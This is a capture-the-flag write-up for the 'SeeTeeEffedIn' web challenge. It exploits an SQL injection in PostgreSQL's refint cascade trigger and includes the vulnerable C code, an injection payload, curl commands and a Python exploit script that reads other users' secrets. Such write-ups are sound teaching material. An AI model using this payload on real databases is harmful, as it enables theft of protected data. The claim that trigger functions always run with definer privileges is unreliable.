# SeeTeeEffedIn — Grey Cat The Flag Quals 2026

**Category:** `Web`  
**Difficulty:** `Hard`  
**Flag:** `grey{refint_c4Scad3_Upd4t3_sq1_lnject10n}`  

> A social media app ("SeeTeeEffedIn") where users can register, log in, rename their private handles, and make posts. Each player has a secret flag stored in a row-level-security-protected `secrets` table.

---

## Challenge Overview

The challenge presents a Flask web application backed by **PostgreSQL 18.3**. Users can:

- Register with a public username, private username, password, display name, and bio
- Log in to receive a session token
- View and update their profile
- Rename their private-facing username (handle)
- Make posts on a public feed

Each player gets a **flag** stored in a `secrets` table, protected by **Row-Level Security (RLS)** such that only the owning player can SELECT their own flag. The goal is to find a way to read another player's flag — or better yet, inject a query that reads it into a column we can retrieve.

The critical clue: the database uses `postgres:18.3`, and the `refint` extension (the old contrib module for foreign key enforcement) is loaded.

---

## Source Code Analysis

### Architecture

```
POST /api/register     → register_player() PL/pgSQL function
POST /api/login        → login_player() PL/pgSQL function
GET  /api/me           → returns session profile incl. session_note
POST /api/profile/private-rename → renames the private username
```

All database operations go through the `app_user` PostgreSQL role, which has limited column-level privileges on each table.

### Flag Storage & RLS

From `init.sql`:

```sql
CREATE TABLE secrets (
    owner_player_id INTEGER PRIMARY KEY,
    flag TEXT NOT NULL
);
ALTER TABLE secrets OWNER TO flag_owner;
REVOKE ALL ON secrets FROM app_user;
GRANT SELECT (owner_player_id, flag) ON secrets TO app_user;

ALTER TABLE secrets ENABLE ROW LEVEL SECURITY;
ALTER TABLE secrets FORCE ROW LEVEL SECURITY;

CREATE POLICY secrets_select_policy
ON secrets FOR SELECT TO app_user
USING (owner_player_id = current_setting('app.player_id', true)::integer);
```

The key observation: `app_user` is **granted SELECT on `secrets.flag`**, but RLS restricts that SELECT to only rows where `owner_player_id` equals the current session's `app.player_id`. The `app.player_id` is set via `set_config('app.player_id', %s, true)` at the start of each request.

This means we cannot simply SELECT from `secrets` — we can only see our own flag. However, this also means that if we can execute SQL in a context where `app.player_id` is set, any subquery we inject that reads from `secrets` will return the current player's flag (which is useless). But crucially, the `check_foreign_key` trigger function runs as `postgres` (the table owner), **bypassing RLS entirely**.

### The refint Extension & Triggers

The `refint` extension provides two functions: `check_foreign_key()` and `check_primary_key()`. These are used to implement foreign key constraints declaratively. The challenge sets up two critical triggers:

```sql
-- On UPDATE/DELETE of player_usernames, cascade to user_sessions
CREATE CONSTRAINT TRIGGER player_usernames_refint_cascade
    AFTER UPDATE OR DELETE ON player_usernames
    FOR EACH ROW
    EXECUTE FUNCTION check_foreign_key(
        1, 'cascade', 'username', 'user_sessions', 'username'
    );

-- On INSERT/UPDATE of user_sessions, validate FK to player_usernames
CREATE CONSTRAINT TRIGGER user_sessions_refint_validate
    AFTER INSERT OR UPDATE ON user_sessions
    FOR EACH ROW
    EXECUTE FUNCTION check_primary_key(
        'username', 'player_usernames', 'username'
    );
```

When a user renames their private username via `POST /api/profile/private-rename`, the app runs:

```python
UPDATE player_usernames SET username = %s WHERE player_id = %s AND is_private;
```

This triggers `player_usernames_refint_cascade`, which internally runs an UPDATE on `user_sessions` to keep the session username in sync. That's where the bug lives.

### The Vulnerable Endpoint

The `private-rename` endpoint (`backend/app.py:541`):

```python
@bp.route("/api/profile/private-rename", methods=["POST"])
def rename_private_profile():
    payload = request.get_json(silent=True) or {}
    new_username = payload.get("username", "")
    ...
    cur.execute("""
        UPDATE player_usernames
        SET username = %s
        WHERE player_id = %s AND is_private;
    """, (new_username, profile["player_id"]))
```

The `new_username` value is properly parameterized for the `player_usernames` UPDATE itself. However, the cascade trigger that fires *after* this UPDATE constructs its own SQL using the **raw, unescaped** NEW value — and that's where the injection occurs.

---

## Vulnerability Discovery

### What is `check_foreign_key()`?

The `refint` extension's `check_foreign_key()` is a C function that generates SQL dynamically. For a `cascade` action on UPDATE, it constructs a query like:

```sql
UPDATE <referenced_table> SET <pk_col> = '<new_value>' WHERE <pk_col> = $1
```

Where `<new_value>` is the **raw** NEW value from the triggered tuple. The WHERE clause properly uses `$1` as a parameterized placeholder for the OLD value.

### The SQL Injection (CVE-2026-6637)

The vulnerable code in PostgreSQL 18.3 and earlier (from `contrib/spi/refint.c`):

```c
for (k = 1; k <= nkeys; k++)
{
    nv = SPI_getvalue(newtuple, tupdesc, fn);

    /* BUG: value is concatenated without escaping single quotes */
    snprintf(sql + strlen(sql), sizeof(sql) - strlen(sql),
             " %s = %s%s%s %s ",
             args2[k],
             (is_char_type > 0) ? "'" : "",    /* opening quote */
             nv,                                  /* RAW VALUE — vulnerability! */
             (is_char_type > 0) ? "'" : "",    /* closing quote */
             (k < nkeys) ? ", " : "");
}

/* WHERE clause uses parameterized $1 (safe) */
for (i = 1; i <= nkeys; i++)
{
    snprintf(sql + strlen(sql), sizeof(sql) - strlen(sql),
             "%s = $%d ", args2[i], i);
}
```

The `nv` value (the NEW private username) is placed directly into the SQL string wrapped in single quotes. If `nv` contains a single quote, the SQL string is broken, enabling injection.

For our trigger, the constructed SQL looks like:

```sql
UPDATE user_sessions SET username = '<NV>' WHERE username = $1
```

If we set NV to something containing `'`, we break out of the string literal.

### Plan Caching — A Wrinkle

The function caches prepared plans per `(trigger_name, relation_oid, operation_type)`. Once a plan is created with a specific SQL text, it is reused on subsequent calls. This means:

1. The FIRST cascade call on a given backend process determines the SQL for all subsequent calls
2. If someone else's cascade created the plan with a benign value first, our injection won't take effect

However, given many concurrent backend processes (each request typically gets its own), and the server resetting every 5 minutes, we can usually reach a "fresh" backend.

---

## Exploit Development

### Step 1: Understanding the Constructed SQL

For our trigger `check_foreign_key(1, 'cascade', 'username', 'user_sessions', 'username')` with `nkeys=1`:

```sql
UPDATE user_sessions SET username = '<NV>' WHERE username = $1
```

- `NV` = the new private username (our injectable value)
- `$1` = bound to the OLD private username (parameterized, safe)

If NV = `foo', session_note = 'bar' WHERE username = $1--`:

```sql
UPDATE user_sessions SET username = 'foo', session_note = 'bar' WHERE username = $1--' WHERE username = $1
```

After the `--` comment removes the trailing `' WHERE username = $1`:

```sql
UPDATE user_sessions SET username = 'foo', session_note = 'bar' WHERE username = $1
```

This has **one** `$1` parameter, which matches `nkeys=1`, so `SPI_prepare()` succeeds.

### Step 2: The FK Validation Trap

There is a **second** constraint trigger on `user_sessions`:

```sql
CREATE CONSTRAINT TRIGGER user_sessions_refint_validate
    AFTER INSERT OR UPDATE ON user_sessions
    FOR EACH ROW
    EXECUTE FUNCTION check_primary_key('username', 'player_usernames', 'username');
```

This fires immediately after the cascade UPDATE and runs:

```sql
SELECT 1 FROM player_usernames WHERE username = $1
```

Where `$1` is the **NEW** `username` value from `user_sessions`.

If our injection sets `username = 'foo'` but `foo` does **not** exist in `player_usernames`, this constraint check fails, the entire transaction rolls back, and we get the generic **"Database error occurred."** response.

**This is the critical insight.** The injected username must exist in `player_usernames` for the FK validation to pass.

### Step 3: Crafting the Payload

We know our public username (e.g., `inj1`) exists in `player_usernames` as the `is_primary` entry. So we inject:

```
inj1', session_note = (SELECT flag FROM secrets LIMIT 1) WHERE username = $1--
```

Breaking this down:

| Part | Purpose |
|------|---------|
| `inj1'` | Closes the quote, sets `username = 'inj1'` (exists in `player_usernames`, FK passes) |
| `, session_note = ` | Adds a second SET clause to update `session_note` |
| `(SELECT flag FROM secrets LIMIT 1)` | Subquery reads the flag. Runs as `postgres` (trigger owner), **bypassing RLS** |
| `WHERE username = $1` | Completes the WHERE clause with the parameterized OLD value |
| `--` | Comments out the remaining `' WHERE username = $1` that the trigger appends |

**Why the subquery can read any player's flag:** The `check_foreign_key()` function executes as `postgres` (the table owner), and PostgreSQL trigger functions run with the privileges of the trigger definer. The `app_user`'s RLS policy on `secrets` is **not enforced** because `postgres` is a superuser and bypasses RLS entirely. So `SELECT flag FROM secrets LIMIT 1` returns **the first flag in the table** — which could be any player's.

---

## The Exploit

```bash
# 1. Register a fresh account (server resets every 5 min)
curl -s -X POST "http://challs.nusgreyhats.org:34567/api/register?token=<TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"username": "inj1", "private_username": "inj1_priv", "password": "password1"}'

# Extract session token from response (e.g., "abc123...").

# 2. Send the injection via private-rename
curl -s -X POST \
  "http://challs.nusgreyhats.org:34567/api/profile/private-rename?token=<TOKEN>" \
  -H "Content-Type: application/json" \
  -H "X-Session-Token: abc123..." \
  -d '{"username": "inj1'"'"', session_note = (SELECT flag FROM secrets LIMIT 1) WHERE username = $1--"}'

# 3. Read the flag from session_note
curl -s "http://challs.nusgreyhats.org:34567/api/me?token=<TOKEN>" \
  -H "X-Session-Token: abc123..." | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['session_note'])"
```

**Output:**
```json
{
  "status": "success",
  "data": {
    "session_note": "grey{refint_c4Scad3_Upd4t3_sq1_lnject10n}",
    "session_username": "inj1",
    ...
  }
}
```

### Full Exploit Script

```python
import json, sys, requests

BASE = "http://challs.nusgreyhats.org:34567"
TOKEN = "tt_AUsx83Ylp6zUwu1Ldrh_YWWBMdQNeLC0_ll_G4NbAnU"

# Register
r = requests.post(f"{BASE}/api/register?token={TOKEN}", json={
    "username": "inj1", "private_username": "inj1_priv", "password": "password1"
})
session_token = r.json()["data"]["session_token"]

# Inject
payload = "inj1', session_note = (SELECT flag FROM secrets LIMIT 1) WHERE username = $1--"
requests.post(f"{BASE}/api/profile/private-rename?token={TOKEN}",
    headers={"X-Session-Token": session_token},
    json={"username": payload})

# Read flag
r = requests.get(f"{BASE}/api/me?token={TOKEN}",
    headers={"X-Session-Token": session_token})
print(r.json()["data"]["session_note"])
```

---

## The Fix (PostgreSQL 18.4)

The fix for CVE-2026-6637, committed as [`260e977`](https://github.com/postgres/postgres/commit/260e97733bf09acc448faea24fc6210411892b1a), replaces the manual string concatenation with `quote_literal_cstr()`:

```c
/* BEFORE (vulnerable): */
snprintf(sql + ..., " %s = %s%s%s %s ",
         args2[k], "'", nv, "'", "");

/* AFTER (fixed): */
appendStringInfo(&sql, " %s = %s ",
                 args2[k], quote_literal_cstr(nv));
```

`quote_literal_cstr()` properly escapes single quotes (doubling `'` to `''`) and wraps the result in single quotes, making injection impossible.

The fix also moves from stack-based `char[8192]` buffers to `StringInfo` to prevent buffer overflows.

---

## Key Takeaways

1. **Trigger-defined functions can be attack surfaces** — Even when application code uses parameterized queries, triggers that build SQL dynamically may introduce injection vectors.

2. **Security definer context matters** — The `check_foreign_key()` function runs as `postgres`, bypassing RLS. This means any subquery injected into the trigger executes with superuser privileges.

3. **Constraint triggers execute sequentially** — The FK validation trigger (`check_primary_key`) fires after the cascade UPDATE. If the injected SQL violates the FK constraint (by setting `username` to a non-existent value), the entire transaction rolls back.

4. **CVE-2026-6637 in the wild** — This vulnerability affects all PostgreSQL versions before 18.4. The fix backports to 14+.

5. **Least privilege for database roles** — The `refint` functions execute with definer rights. If they could be sandboxed or use `SECURITY INVOKER`, the blast radius would be limited.
